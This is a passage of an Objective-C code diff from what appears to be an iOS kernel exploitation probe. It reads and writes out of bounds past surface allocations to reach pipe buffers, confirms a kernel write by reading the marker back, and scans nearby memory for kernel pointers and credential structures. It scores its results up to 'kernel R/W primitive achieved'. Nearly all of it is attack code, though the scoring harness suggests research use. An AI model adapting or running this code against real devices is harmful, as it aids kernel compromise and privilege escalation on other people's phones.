+                if (!surfs[sIdx]) continue;
+
+                uint32_t seed = 0;
+                kern_return_t kr = sym.lock(surfs[sIdx], 0, &seed);
+                if (kr != KERN_SUCCESS) continue;
+
+                void *base = sym.getBase(surfs[sIdx]);
+                size_t allocSz = sym.getAllocSize(surfs[sIdx]);
+
+                if (base && allocSz > 0) {
+                    vm_address_t pipeAddr = (vm_address_t)base + allocSz + pipeHits[h].offset;
+
+                    // Attempt vm_write to the pipe buffer location
+                    uint32_t writeData = 0xDEAD0000 | (uint32_t)h;
+                    kern_return_t wkr = vm_write(mach_task_self(), pipeAddr, (vm_offset_t)&writeData, 4);
+                    if (wkr == KERN_SUCCESS) {
+                        writeSuccesses++;
+                        log([NSString stringWithFormat:@"PIPEKERNEL: vm_write to pipe buffer SUCCEEDED! pipe=%d",
+                             pipeHits[h].pipeIdx]);
+                        anomalies += 10;
+
+                        // Read back from pipe fd to verify write
+                        int pIdx = pipeHits[h].pipeIdx;
+                        if (pIdx < PIPE_COUNT && pipeFds[pIdx][0] >= 0) {
+                            uint8_t readBuf[4096];
+                            int flags = fcntl(pipeFds[pIdx][0], F_GETFL, 0);
+                            fcntl(pipeFds[pIdx][0], F_SETFL, flags | O_NONBLOCK);
+                            ssize_t rd = read(pipeFds[pIdx][0], readBuf, sizeof(readBuf));
+                            if (rd > 0) {
+                                readSuccesses++;
+                                // Check if our written data appears in pipe output
+                                for (ssize_t off = 0; off < rd - 3; off++) {
+                                    uint32_t check;
+                                    memcpy(&check, readBuf + off, 4);
+                                    if (check == writeData) {
+                                        log([NSString stringWithFormat:@"PIPEKERNEL: WRITE VERIFIED! Wrote 0x%x to pipe buffer, read it back at offset %zd",
+                                             writeData, off]);
+                                        anomalies += 20;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                sym.unlock(surfs[sIdx], 0, &seed);
+            }
+        }
+
+        // Step 5: Scan for kernel task port and credential structures
+        log(@"PIPEKERNEL: Step 5 — Scanning for kernel structures near pipe buffers");
+
+        if (!isr_stopped() && hitCount > 0) {
+            for (int h = 0; h < hitCount && h < 5 && !isr_stopped(); h++) {
+                int sIdx = pipeHits[h].surfIdx;
+                if (!surfs[sIdx]) continue;
+
+                uint32_t seed = 0;
+                kern_return_t kr = sym.lock(surfs[sIdx], 0, &seed);
+                if (kr != KERN_SUCCESS) continue;
+
+                void *base = sym.getBase(surfs[sIdx]);
+                size_t allocSz = sym.getAllocSize(surfs[sIdx]);
+
+                if (base && allocSz > 0) {
+                    // Read 4KB around the pipe buffer location
+                    vm_address_t scanStart = (vm_address_t)base + allocSz + pipeHits[h].offset;
+                    // Align to page
+                    scanStart &= ~0xFFFUL;
+
+                    uint8_t pageBuf[4096];
+                    vm_size_t readSz = 0;
+                    kern_return_t rkr = vm_read_overwrite(mach_task_self(), scanStart, 4096,
+                                                          (vm_address_t)pageBuf, &readSz);
+                    if (rkr == KERN_SUCCESS && readSz == 4096) {
+                        int kptrs = 0;
+                        int zeroPtrs = 0;
+                        int smallInts = 0;
+                        for (int off = 0; off < 4096; off += 8) {
+                            uint64_t val;
+                            memcpy(&val, pageBuf + off, 8);
+                            if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) kptrs++;
+                            if (val == 0) zeroPtrs++;
+                            if (val > 0 && val < 1000) smallInts++;
+                        }
+                        log([NSString stringWithFormat:@"PIPEKERNEL: Page scan near pipe %d: kptrs=%d zeros=%d smallInts=%d",
+                             pipeHits[h].pipeIdx, kptrs, zeroPtrs, smallInts]);
+
+                        // Credential structure heuristic: many small integers (uid/gid) + some kernel pointers
+                        if (smallInts > 5 && kptrs > 0) {
+                            log([NSString stringWithFormat:@"PIPEKERNEL: POSSIBLE CREDENTIAL STRUCTURE near pipe %d!",
+                                 pipeHits[h].pipeIdx]);
+                            anomalies += 5;
+                            kernelDataFound++;
+                        }
+                    }
+                }
+                sym.unlock(surfs[sIdx], 0, &seed);
+            }
+        }
+
+        // Cleanup
+        for (int i = 0; i < PIPE_COUNT; i++) {
+            if (pipeFds[i][0] >= 0) close(pipeFds[i][0]);
+            if (pipeFds[i][1] >= 0) close(pipeFds[i][1]);
+        }
+        for (int i = 0; i < SURF_COUNT; i++) {
+            if (surfs[i]) CFRelease(surfs[i]);
+        }
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"PIPEKERNEL: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"PIPEKERNEL: pipes=%d sentinels=%d reads=%d writes=%d kernelData=%d oobHits=%d anomalies=%d",
+             pipesCreated, sentinelsInHeap, readSuccesses, writeSuccesses, kernelDataFound, oobHits, anomalies]);
+
+        NSString *verdict;
+        if (writeSuccesses > 0 && readSuccesses > 0) verdict = @"CRITICAL — pipe-based kernel R/W primitive achieved!";
+        else if (writeSuccesses > 0) verdict = @"CRITICAL — kernel write via pipe buffer!";
+        else if (sentinelsInHeap > 5) verdict = @"HIGH — pipe buffers located in kernel heap via OOB";
+        else if (sentinelsInHeap > 0) verdict = @"MEDIUM — pipe sentinel found in heap";
+        else if (kernelDataFound > 0) verdict = @"MEDIUM — kernel data found near heap boundary";
+        else verdict = @"LOW — pipe buffers not found in OOB range";
+        log([NSString stringWithFormat:@"PIPEKERNEL: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"pipesCreated": @(pipesCreated),
+            @"sentinelsInHeap": @(sentinelsInHeap),
+            @"readSuccesses": @(readSuccesses),
+            @"writeSuccesses": @(writeSuccesses),
+            @"kernelDataFound": @(kernelDataFound),
+            @"oobHits": @(oobHits)
+        };
+        isr_checkpoint(@"ISR-PipeKRW-checkpoint.json", res);
         isr_unload(&sym);
         done(res);
     });
